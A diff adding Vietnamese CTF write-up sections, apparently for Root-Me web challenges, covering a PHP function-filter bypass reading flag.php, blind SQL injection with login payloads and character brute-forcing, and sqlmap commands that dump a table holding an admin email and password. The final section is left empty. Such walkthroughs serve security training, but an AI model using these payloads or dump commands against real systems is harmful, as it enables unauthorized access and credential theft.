@@ -96,4 +96,45 @@ Warning: exec() has been disabled for security reasons in /challenge/web-serveur
 4. Các hàm như exec, shell_exec, system đều bị filter. Ở đây ta có thể dùng các hàm sau đều có thể exploit được đó là `phpinfo()`, `file_get_content("flag.php")` hoặc `fread(fopen("flag.php","r"),filesize("flag.php"))`
 ![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/9c01d6f4-804d-4c8a-928f-40d0529d1b51)
 
-##
+## SQL injection - Blind
+
+1. Với tiêu đề là SQLi ô login ta sẽ thử các payload ở ô username.
+`admin' OR 1=1--`: Hiện lên thông báo log thành công vào user `user1` như vậy với payload mà tất cả record đều hợp lệ thì user `user1` được để ở đầu nên sẽ log vào nó.
+`admin' AND 1=1--`: Log thành công vào tk `admin`
+2. Như vậy ta có thể lợi dụng thông tin báo log thành công hay không để thực hiện blind boolean query. Xác định thông qua các bảng metadata biết được có bảng `users`
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/9ece16e4-254c-44c6-b1dc-f0afe6669107)
+3. Sau đó brute-force các ký tự trong bảng sql của bảng `sqlite_master`.
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/734a43a6-4fdb-4714-ad59-2138e39a4d24)
+4. Tiếp theo brute-force các ký tự password. Từ đó nhận được password -> flag. 
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/2feea9ae-e728-49db-8ec8-fa79217e5183)
+5. Cách thứ 2 là dùng sqlmap
+6. Trước hết lưu request thử function vào một file ví dụ blind_sqli.txt `sqlmap -r blind_sqli.txt --dbs` thì nhận được recommend nên tìm bằng `sqlmap -r blind_sqli.txt --tables`
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/37fc59e9-f4d6-47f7-86ee-9ccc50c01b81)
+7. Tìm được bảng user. Tiếp theo dump các record trong bảng.  `sqlmap -r blind_sqli.txt -T users --dump`
+![image](https://github.com/cuong9cm/CTFwriteup/assets/80744099/fb106167-b3b4-43ff-abae-344f9b2e165a) 
+
+## SQL injection error-based (sqlmap)
+
+1. sqlmap với các payload
+- ``sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs``:
+	- Lấy được danh sách 3 database:
+``
+[*] information_schema
+[*] pg_catalog
+[*] public
+``
+- ``sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables``
+	- Lấy được 2 table trong database public: content, m3mbr35t4bl3
+- ``sqlmap -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump``
+	- Lấy được các record trong bảng:
+```
++----+-----------------+----------------------+--------------+
+| id | em41l_c0l       | p455w0rd_c0l         | us3rn4m3_c0l |
++----+-----------------+----------------------+--------------+
+| 1  | admin@localhost | 1a2BdKT5DIx3qxQN3UaC | admin        |
++----+-----------------+----------------------+--------------+
+```
+
+## SQL injection error-based (manually)
+
+1. 
